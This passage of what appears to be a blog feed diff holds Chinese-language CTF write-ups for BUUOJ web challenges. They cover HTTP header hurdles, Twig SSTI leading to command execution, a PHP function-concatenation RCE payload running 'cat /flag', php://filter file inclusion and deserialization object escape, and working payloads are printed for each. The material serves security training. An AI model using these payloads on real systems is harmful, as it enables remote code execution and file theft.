+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;Fuxku&#39;</span><br></pre></td></tr></table></figure>
+<p>得到<code>I&#39;m sorry, I was expecting the cookie to contain the number of the HTTP Cookie (State Management Mechanism) RFC from 2011.</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 这里需要cookie包含2021年的RFC编号，可以到这查https:&#x2F;&#x2F;datatracker.ietf.org&#x2F;doc&#x2F;draft-ietf-httpstate-cookie&#x2F;23&#x2F;</span><br><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;6265&#39;</span><br></pre></td></tr></table></figure>
+<p>得到<code>I&#39;m sorry, I expect you to accept only plain text media (MIME) type.</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;6265&#39; -H &#39;accept: text&#x2F;plain&#39;</span><br></pre></td></tr></table></figure>
+<p>得到<code>I&#39;m sorry, Я ожидал, что вы говорите по-русски.</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;6265&#39; -H &#39;accept: text&#x2F;plain&#39; -H &#39;Accept-Language: ru&#39;</span><br></pre></td></tr></table></figure>
+<p>得到<code>I&#39;m sorry, I was expecting to share resources with the origin https://ctf.bsidessf.net</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;6265&#39; -H &#39;accept: text&#x2F;plain&#39; -H &#39;Accept-Language: ru&#39; -H &#39;origin: https:&#x2F;&#x2F;ctf.bsidessf.net&#39;</span><br></pre></td></tr></table></figure>
+<p>得到<code>I&#39;m sorry, I was expecting you would be refered by https://ctf.bsidessf.net/challenges?</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39; -b &#39;Fortune&#x3D;6265&#39; -H &#39;accept: text&#x2F;plain&#39; -H &#39;Accept-Language: ru&#39; -H &#39;origin: https:&#x2F;&#x2F;ctf.bsidessf.net&#39; -e &#39;https:&#x2F;&#x2F;ctf.bsidessf.net&#x2F;challenges&#39;</span><br></pre></td></tr></table></figure>
+<p>最终得到flag</p>
+<blockquote>
+<p>flag{a3dda583-ca36-4b88-935f-cb4bbbeef896}</p>
+</blockquote>
+<h2 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h2><h3 id="SSTI-Twig"><a href="#SSTI-Twig" class="headerlink" title="SSTI(Twig"></a>SSTI(Twig</h3><p>Twig的模板注入，判断如下：</p>
+49 回显7777777 => Jinja2 ，回显49 => Twig
+
+<p>payload</p>
+<figure class="highlight twig"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;</span><span class="template-variable">&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+<p>拿到flag</p>
+<blockquote>
+<p>flag{c485b15c-f3df-4dc8-abb3-ed322ea30c66}</p>
+</blockquote>
+<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><h3 id="php函数拼接"><a href="#php函数拼接" class="headerlink" title="php函数拼接"></a>php函数拼接</h3><p>构造payload</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="variable">$$pi</span>&#123;pi&#125;(<span class="variable">$$pi</span>&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</span><br></pre></td></tr></table></figure>
+<p>base_convert(37907361743,10,36)构造函数名hex2bin，hex2bin可以将十六进制转换为ASCII字符</p>
+<p>先使用dechex函数将<code>1598506324</code>转换为十六进制，然后再使用hex2bin将十六进制转换成ASCII字符即可得到_GET</p>
+<h3 id="php特性利用"><a href="#php特性利用" class="headerlink" title="php特性利用"></a>php特性利用</h3><p>php中可以使用{}代替[]，然后再拼接一下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$$pi</span>&#123;pi&#125; =&gt; <span class="variable">$_GET</span>&#123;pi&#125;</span><br><span class="line">(<span class="variable">$$pi</span>&#123;abs&#125;) =&gt; (<span class="variable">$_GET</span>&#123;abs&#125;)</span><br></pre></td></tr></table></figure>
+<p>最后传入<code>pi=system，abs=cat /flag</code>即可得到flag</p>
+<blockquote>
+<p>flag{693ee03e-518a-46bb-9102-79ac9f502b31}</p>
+</blockquote>
+<h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><h3 id="php伪协议嵌套"><a href="#php伪协议嵌套" class="headerlink" title="php伪协议嵌套"></a>php伪协议嵌套</h3><p>利用php伪协议可以读取到index的源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?category=php:<span class="comment">//filter/convert.base64-encode/resource=index</span></span><br></pre></td></tr></table></figure>
+<p>得到源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos(<span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span>) !== <span class="literal">false</span> || strpos(<span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span>) !== <span class="literal">false</span> || strpos(<span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现需要包括<code>woofers</code>、<code>meowers</code>、<code>index</code>才会运行文件包含</p>
+<p>查了查之后知道了php的<code>php://filter</code>伪协议可以嵌套一层协议</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?category=php:<span class="comment">//filter/convert.base64-encode/index/resource=flag</span></span><br></pre></td></tr></table></figure>
+<p>即可得到flag</p>
+<blockquote>
+<p>flag{ff24c3cf-9d00-4527-acab-ee177724d0a1}</p>
+</blockquote>
+<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><h3 id="phpinfo信息获取"><a href="#phpinfo信息获取" class="headerlink" title="phpinfo信息获取"></a>phpinfo信息获取</h3><p>看到题目中有个<code>eval(&#39;phpinfo();&#39;);</code></p>
+<p>打开后在phpinfo里发现了一个<code>d0g3_f1ag.php</code></p>
+<h3 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h3><p>题目所给的源代码中有extract函数，可形成变量覆盖漏洞，<a href="https://blog.csdn.net/weixin_34486302/article/details/115153306?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161857274516780357224643%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161857274516780357224643&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-115153306.first_rank_v2_pc_rank_v29&utm_term=extract%E5%AF%BC%E8%87%B4%E7%9A%84%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96&spm=1018.2226.3001.4187">具体看这</a></p>
+<p>于是可以重新传入SESSION参数进行覆盖</p>
+<h3 id="反序列化对象逃逸"><a href="#反序列化对象逃逸" class="headerlink" title="反序列化对象逃逸"></a>反序列化对象逃逸</h3><p>由题目可知，想要得到flag，必须得构造一个img=d0g3_f1ag.php，但是如果直接传入d0g3_f1ag.php则会被正则替换掉</p>
+<p>于是可以使用反序列化的对象逃逸性质</p>
+<p>正常序列化</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;function&quot;</span>] = <span class="string">&#x27;ababab&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;img&quot;</span>] = base64_encode(<span class="string">&#x27;d0g3_f1ag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$_SESSION</span>);</span><br></pre></td></tr></table></figure>
+<p>可以得到</p>
+<blockquote>
+<p>a:3:{s:4:”user”;s:5:”guest”;s:8:”function”;s:6:”ababab”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}</p>
+</blockquote>
+<p>于是我们可以这样POST</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;ababab&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>会得到这个</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$flag</span> = <span class="string">&#x27;flag in /d0g3_fllllllag&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>解释一下.jpg</code></p>
+<p>按照上面POST的序列化，可以得到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;flagflagflagflagflagflag&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">70</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;ababab&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+<p>而flag被过滤了，于是会得到</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">70</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;ababab&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+<p>由于user的参数为24，而原来的6个flag变为””了，所以会往后继续读取参数</p>
+<p>所以[]的参数就被读取为user的参数了，而原来的function则被替换掉了，再加上最后的}闭合，后面的img也被替换掉了，就造成了反序列化的对象逃逸</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;[&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">70</span>:<span class="string">&quot;a]&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;ababab&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+<p>最后则通过提示flag在<code>/d0g3_fllllllag</code>中，重新放个base64进去得到flag</p>
+<blockquote>
+<p>flag{f7eb2141-7201-43fe-b97d-cc5defacd03d}</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>WriteUp</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Web</tag>
+        <tag>BUUOJ</tag>
       </tags>
   </entry>
   <entry>
